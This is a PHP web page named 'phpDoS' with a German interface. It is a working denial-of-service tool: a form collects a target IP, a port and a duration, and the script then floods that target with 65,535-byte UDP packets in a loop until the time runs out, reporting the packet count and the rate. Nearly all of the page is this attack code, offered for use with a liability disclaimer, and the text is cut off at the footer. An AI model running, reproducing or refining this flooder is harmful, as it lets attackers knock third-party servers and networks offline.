<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
       "http://www.w3.org/TR/html4/loose.dtd"> 
<html> 
<head> 
<title>phpDoS</title> 
<style type="text/css"> 
<!--
	body {
			font-family: Ubuntu;
			font-size:13px;
			background: #EFEFEF;
	}
	#content{
			border:1px solid #BEBEBE;	
			background-color: #FFF;
			padding: 20px;
			width: 500px;
			margin: auto;
			margin-top: 10%;
			text-align: left;
			box-shadow: 0 0 3px rgba(0,0,0,0.5);
			-webkit-box-shadow: 0 0 3px rgba(0,0,0,0.5);
			-moz-box-shadow: 0 0 3px rgba(0,0,0,0.5);
	}
	#footer {
			width: 500px;
			margin: auto;
			font-size: 12px;
			text-align:center;
	}
	#info {
			padding: 0.2em;
			padding-left: 4em;
			background-position: .3em .3em;
			background-image: url(http://static.hostplanet.me/img/information.png);
			background-repeat: no-repeat;
			background-color: rgb(215, 220, 233);
			border: 2px solid rgb(123, 159, 223);
			min-height: 34px;
			padding-top:10px;
	}
-->
</style> 
<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Ubuntu" /> 
</head> 
<body> 
	<div id="content"> 
		<form action="" method="post">
			<table>
				<tr>
					<td width="150">IP:</td><td><input type="text" name="ip"></td>
				</tr>
				<tr>
					<td>Port:</td><td><input type="text" name="port"></td>
				</tr>
				<tr>
					<td>Zeit (in Sekunden):</td><td><input type="text" name="time"></td>
				</tr>
				<tr>
					<td></td><td><input type="submit" value="DoS starten" onclick="return confirm('M&ouml;chtest Du den DoS wirklich starten? Du kannst den DoS nicht stoppen und das php-DoS Team &uuml;bernehmt keine Haftung. Wenn Du das best&auml;tigst, klicke auf OK')"></td>
			</table>
		</form>
		<?php
		$currentsrv = $_SERVER['HTTP_HOST'];
		$currip = gethostbyname($currentsrv);
			//Lets do it..
			if($_POST)
			{
			echo "<br><br>";
			  if(!empty($_POST['ip']) && !empty($_POST['time']))
			  {
				$packets = 0;
				$ip = $_POST['ip'];
				$port = $_POST['port'];
			  
				set_time_limit(0);
				ignore_user_abort(FALSE);

				$dostime = $_POST['time'];

				$time = time();
				$max_time = $time+$dostime;

				for($i=0;$i<65535;$i++){
					 $out .= "Y";
				}
				  while(1){
					$packets++;
					  if(time() > $max_time){
							break;
					  }

					  $fp = fsockopen("udp://$ip", $port, $errno, $errstr, 5);
					  if($fp){
							fwrite($fp, $out);
							fclose($fp);
					  }
			  }
				echo '<div id="info">phpdoS@'.$currip.' ~ DoS auf '.$_POST['ip'].': <br /><br />';
				echo $packets." Anfragen <br />";
				echo round(($packets*2)/1024, 2)." MB <br />";
				echo round($packets/$dostime, 2)." Anfragen per Sekunde <br />";
				echo '</div>';
			  }
			  else
			  {
				echo '<div id="info">Bitte f&uuml;lle alle Felder aus.</div>';
			  }
			}
		?>
	</div> 
	<div id="footer"> 
